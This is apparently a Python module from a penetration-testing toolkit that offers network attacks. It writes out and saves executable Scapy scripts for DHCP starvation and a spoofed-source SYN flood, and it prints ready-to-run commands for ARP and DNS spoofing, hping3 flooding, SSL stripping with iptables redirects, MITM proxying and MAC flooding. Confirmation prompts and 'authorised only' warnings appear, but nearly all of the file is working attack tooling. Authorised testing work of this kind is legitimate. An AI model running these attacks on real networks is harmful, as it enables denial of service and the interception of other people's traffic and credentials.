"""
ptcenter.modules.network
========================
Network attack modules: ARP spoof, DNS spoof, DHCP starvation, SYN flood,
SSL strip, MITM setup, sniffing, MAC flooding.
"""

from __future__ import annotations

import shutil
from datetime import datetime
from pathlib import Path
from typing import Optional

from rich.console import Console
from rich.panel import Panel

from ptcenter.core.sysinfo import install_hint
from ptcenter.core.runner import run_command
from ptcenter.core.validator import validate_ip, validate_port

console = Console()


def _ts() -> str:
    return datetime.now().strftime("%Y%m%d_%H%M%S")


def _check(tool: str) -> bool:
    return shutil.which(tool) is not None


def _require_confirm(action: str, session: Optional[dict] = None) -> bool:
    """Demand 'I CONFIRM' before any destructive operation; log to session."""
    console.print(
        f"\n[bold red]⚠ DANGER:[/] You are about to perform: [bold]{action}[/]\n"
        "[red]This may disrupt the network. Use only on authorised systems![/]\n"
    )
    answer = console.input("[bold yellow]Type 'I CONFIRM' to proceed: [/]").strip()
    if answer != "I CONFIRM":
        console.print("[dim]Cancelled[/]")
        return False
    # Log confirmation to session
    if session is not None:
        from ptcenter.core.session import add_finding
        add_finding(
            session, "network", action, "Info",
            f"User confirmed destructive action: {action}",
            f"Confirmed at {datetime.now().isoformat()}",
        )
    return True


# ARP Spoofing

def arp_spoofing(output_dir: Path, session: Optional[dict] = None) -> None:
    if not _check("arpspoof") and not _check("ettercap"):
        console.print(f"[red]✗[/] No ARP tools.  [dim]{install_hint('arpspoof')}  |  {install_hint('ettercap')}[/]")
        return

    if not _require_confirm("ARP Spoofing", session):
        return

    interface = console.input("[bold white][+] Interface (e.g. eth0): [/]").strip()
    target_ip = console.input("[bold white][+] Target IP: [/]").strip()
    gateway_ip = console.input("[bold white][+] Gateway IP: [/]").strip()

    if not all([interface, target_ip, gateway_ip]):
        console.print("[red]✗[/] All fields required")
        return
    if not validate_ip(target_ip) or not validate_ip(gateway_ip):
        console.print("[red]✗[/] Invalid IP address")
        return

    # Enable IP forwarding (no shell injection — fixed path only)
    run_command(["bash", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"], timeout=5)

    console.print(
        Panel(
            f"[bold blue]Terminal 1:[/]\n"
            f"  sudo arpspoof -i {interface} -t {target_ip} {gateway_ip}\n\n"
            f"[bold blue]Terminal 2:[/]\n"
            f"  sudo arpspoof -i {interface} -t {gateway_ip} {target_ip}\n\n"
            f"[bold blue]Terminal 3 (capture):[/]\n"
            f"  sudo tcpdump -i {interface} -w capture.pcap",
            title="[bold yellow]ARP Spoof Commands[/]",
            border_style="yellow",
        )
    )

    ts = _ts()
    cfg = output_dir / f"arp_spoof_config_{ts}.txt"
    with open(cfg, "w") as fh:
        fh.write(f"ARP Spoofing Config\nInterface: {interface}\n"
                 f"Target: {target_ip}\nGateway: {gateway_ip}\nTime: {datetime.now()}\n")

    console.print(f"[bold green]✓[/] Config saved: [cyan]{cfg}[/]")
    console.print("[dim]Disable forwarding when done: echo 0 > /proc/sys/net/ipv4/ip_forward[/]")


# DNS Spoofing

def dns_spoofing(output_dir: Path, session: Optional[dict] = None) -> None:
    if not _check("dnsspoof") and not _check("ettercap"):
        console.print(f"[red]✗[/] No DNS spoof tools.  [dim]{install_hint('dnsspoof')}[/]")
        return

    if not _require_confirm("DNS Spoofing", session):
        return

    interface = console.input("[bold white][+] Interface: [/]").strip()
    target_domain = console.input("[bold white][+] Domain to spoof: [/]").strip()
    spoofed_ip = console.input("[bold white][+] Redirect to IP: [/]").strip()

    if not all([interface, target_domain, spoofed_ip]):
        console.print("[red]✗[/] All fields required")
        return
    if not validate_ip(spoofed_ip):
        console.print("[red]✗[/] Invalid IP")
        return

    ts = _ts()
    spoof_file = output_dir / f"dns_spoof_{ts}.txt"
    with open(spoof_file, "w") as fh:
        fh.write(f"{target_domain} A {spoofed_ip}\n*.{target_domain} A {spoofed_ip}\n")

    console.print(
        Panel(
            f"[bold blue]Run:[/]\n  sudo dnsspoof -i {interface} -f {spoof_file}\n\n"
            f"[bold blue]Or (Ettercap):[/]\n"
            f"  Edit /etc/ettercap/etter.dns → add: {target_domain} A {spoofed_ip}\n"
            f"  sudo ettercap -T -q -i {interface} -P dns_spoof -M arp ///",
            title="[bold yellow]DNS Spoof[/]",
            border_style="yellow",
        )
    )
    console.print(f"[bold green]✓[/] Spoof file: [cyan]{spoof_file}[/]")


# DHCP Starvation

def dhcp_starvation(output_dir: Path, session: Optional[dict] = None) -> None:
    if not _require_confirm("DHCP Starvation", session):
        return

    interface = console.input("[bold white][+] Interface: [/]").strip()
    if not interface:
        return

    ts = _ts()
    script_path = output_dir / f"dhcp_starvation_{ts}.py"

    script_content = f"""\
#!/usr/bin/env python3
\"\"\"DHCP Starvation script — run as root on authorised networks only.\"\"\"
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp
import random, time

IFACE = "{interface}"

def random_mac():
    return ':'.join('%02x' % random.randint(0, 255) for _ in range(6))

print(f"Starting DHCP starvation on {{IFACE}} — Ctrl+C to stop")
try:
    while True:
        mac = random_mac()
        pkt = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
               IP(src="0.0.0.0", dst="255.255.255.255") /
               UDP(sport=68, dport=67) /
               BOOTP(chaddr=mac) /
               DHCP(options=[("message-type", "discover"), "end"]))
        sendp(pkt, iface=IFACE, verbose=False)
        print(f"\\rSent DHCP Discover from {{mac}}", end="")
        time.sleep(0.05)
except KeyboardInterrupt:
    print("\\nStopped.")
"""
    script_path.write_text(script_content)
    script_path.chmod(0o755)

    console.print(Panel(
        f"[bold blue]Yersinia:[/]  sudo yersinia dhcp -attack 1 -interface {interface}\n\n"
        f"[bold blue]Python (Scapy):[/]  sudo python3 {script_path}",
        title="[bold yellow]DHCP Starvation[/]",
        border_style="yellow",
    ))
    console.print(f"[bold green]✓[/] Script saved: [cyan]{script_path}[/]")


# SYN Flood

def syn_flood(output_dir: Path, session: Optional[dict] = None) -> None:
    if not _check("hping3"):
        console.print(f"[red]✗[/] hping3 not installed.  [dim]{install_hint('hping3')}[/]")
        return

    if not _require_confirm("SYN Flood (DoS)", session):
        return

    target_ip = console.input("[bold white][+] Target IP: [/]").strip()
    target_port = console.input("[bold white][+] Target port: [/]").strip()
    if not validate_ip(target_ip) or not validate_port(target_port):
        console.print("[red]✗[/] Invalid target")
        return

    ts = _ts()
    script_path = output_dir / f"syn_flood_{ts}.py"
    script_content = f"""\
#!/usr/bin/env python3
\"\"\"SYN Flood script — authorised systems only.\"\"\"
from scapy.all import IP, TCP, send
import random

TARGET = "{target_ip}"
PORT = {target_port}
COUNT = 1000

for i in range(COUNT):
    src = ".".join(str(random.randint(0, 255)) for _ in range(4))
    sport = random.randint(1024, 65535)
    pkt = IP(src=src, dst=TARGET) / TCP(sport=sport, dport=PORT, flags="S")
    send(pkt, verbose=False)
    if i % 100 == 0:
        print(f"Sent {{i}} packets…")

print(f"Done — {{COUNT}} SYN packets sent to {{TARGET}}:{{PORT}}")
"""
    script_path.write_text(script_content)
    script_path.chmod(0o755)

    console.print(Panel(
        f"[bold blue]hping3 basic:[/]  sudo hping3 -S {target_ip} -p {target_port} --flood --rand-source\n\n"
        f"[bold blue]hping3 controlled:[/]  sudo hping3 -S {target_ip} -p {target_port} --faster --rand-source\n\n"
        f"[bold blue]Scapy script:[/]  sudo python3 {script_path}",
        title="[bold red]SYN Flood[/]",
        border_style="red",
    ))


# SSL Strip

def ssl_strip(output_dir: Path, session: Optional[dict] = None) -> None:
    if not _check("sslstrip"):
        console.print(f"[red]✗[/] sslstrip not installed.  [dim]{install_hint('sslstrip')}[/]")
        return

    if not _require_confirm("SSL Strip Attack", session):
        return

    interface = console.input("[bold white][+] Interface: [/]").strip()
    if not interface:
        return

    ts = _ts()
    cfg = output_dir / f"sslstrip_setup_{ts}.txt"
    steps = (
        "1. echo 1 > /proc/sys/net/ipv4/ip_forward\n"
        "2. iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\n"
        "3. sslstrip -l 8080\n"
        "4. Perform ARP spoofing against target\n"
    )
    cfg.write_text(f"SSL Strip Setup\nInterface: {interface}\n\n{steps}")

    console.print(Panel(steps, title="[bold yellow]SSL Strip Setup[/]", border_style="yellow"))
    console.print(f"[bold green]✓[/] Saved: [cyan]{cfg}[/]")
    console.print("[dim]Captured creds → sslstrip.log[/]")


# MITM Setup

def mitm_setup(output_dir: Path, session: Optional[dict] = None) -> None:
    if not _check("mitmproxy"):
        console.print(f"[red]✗[/] mitmproxy not installed.  [dim]{install_hint('mitmproxy')}[/]")
        return

    if not _require_confirm("Man-in-the-Middle Proxy", session):
        return

    console.print(
        "\n[bold blue]Tools:[/]\n"
        "  [magenta]1[/] mitmproxy (interactive console)\n"
        "  [magenta]2[/] mitmweb (web UI)\n"
        "  [magenta]3[/] mitmdump (CLI capture)\n"
    )
    choice = console.input("[bold white][+] Select [1-3]: [/]").strip()
    port = console.input("[bold white][+] Proxy port [8080]: [/]").strip() or "8080"
    if not validate_port(port):
        console.print("[red]✗[/] Invalid port")
        return

    ts = _ts()
    cmd_map = {
        "1": f"mitmproxy -p {port}",
        "2": f"mitmweb -p {port}",
        "3": f"mitmdump -p {port} -w {output_dir}/mitm_{ts}.mitm",
    }
    cmd = cmd_map.get(choice, f"mitmproxy -p {port}")

    console.print(Panel(
        f"[bold blue]Start proxy:[/]  {cmd}\n\n"
        f"[bold blue]Set device proxy:[/]  IP=[Your IP]  Port={port}\n\n"
        f"[bold blue]Install cert:[/]  http://mitm.it\n\n"
        f"[bold blue]Transparent mode:[/]\n"
        f"  iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port {port}\n"
        f"  iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port {port}\n"
        f"  mitmproxy --mode transparent -p {port}",
        title="[bold yellow]MITM Setup[/]",
        border_style="yellow",
    ))


# Network Sniffing

def network_sniffing(output_dir: Path) -> None:
    has_tcpdump = _check("tcpdump")
    has_tshark = _check("tshark")
    if not (has_tcpdump or has_tshark):
        console.print(f"[red]✗[/] No capture tools.  [dim]{install_hint('tcpdump')}  |  {install_hint('wireshark')}[/]")
        return

    interface = console.input("[bold white][+] Interface: [/]").strip()
    if not interface:
        return

    console.print(
        "\n[bold blue]Capture options:[/]\n"
        "  [magenta]1[/] All traffic\n  [magenta]2[/] HTTP (port 80)\n"
        "  [magenta]3[/] DNS (udp 53)\n  [magenta]4[/] Specific host\n  [magenta]5[/] Custom BPF\n"
    )
    choice = console.input("[bold white][+] Option: [/]").strip()

    filters = {"1": "", "2": "tcp port 80", "3": "udp port 53"}
    if choice in filters:
        capture_filter = filters[choice]
    elif choice == "4":
        host = console.input("[bold white][+] Host IP: [/]").strip()
        if not validate_ip(host):
            console.print("[red]✗[/] Invalid IP")
            return
        capture_filter = f"host {host}"
    elif choice == "5":
        capture_filter = console.input("[bold white][+] BPF filter: [/]").strip()
    else:
        console.print("[red]✗[/] Invalid selection")
        return

    ts = _ts()
    out = str(output_dir / f"capture_{ts}.pcap")

    if has_tcpdump:
        base_cmd = ["tcpdump", "-i", interface, "-w", out]
    else:
        base_cmd = ["tshark", "-i", interface, "-w", out]

    if capture_filter:
        base_cmd += capture_filter.split()

    console.print(Panel(
        "[bold yellow]⚠[/] Press Ctrl+C in a terminal to stop capture.\n\n"
        f"[bold blue]Run:[/]  sudo {' '.join(base_cmd)}\n\n"
        f"[bold blue]Analyse:[/]  wireshark {out}  |  tcpdump -r {out}",
        title="[bold cyan]Network Sniffing[/]",
        border_style="cyan",
    ))
    console.print(f"[dim]Output will be saved to: {out}[/]")


# MAC Flooding

def mac_flooding(output_dir: Path, session: Optional[dict] = None) -> None:
    if not _check("macof"):
        console.print(f"[red]✗[/] macof not installed.  [dim]{install_hint('macof')}[/]")
        return

    if not _require_confirm("MAC Flooding", session):
        return

    interface = console.input("[bold white][+] Interface: [/]").strip()
    if not interface:
        return

    console.print(Panel(
        f"[bold blue]Run:[/]  sudo macof -i {interface}\n\n"
        "[dim]This floods the switch CAM table, causing it to broadcast all traffic.[/]\n"
        "[yellow]⚠[/] Run for 30–60 s then stop (Ctrl+C)",
        title="[bold red]MAC Flooding[/]",
        border_style="red",
    ))
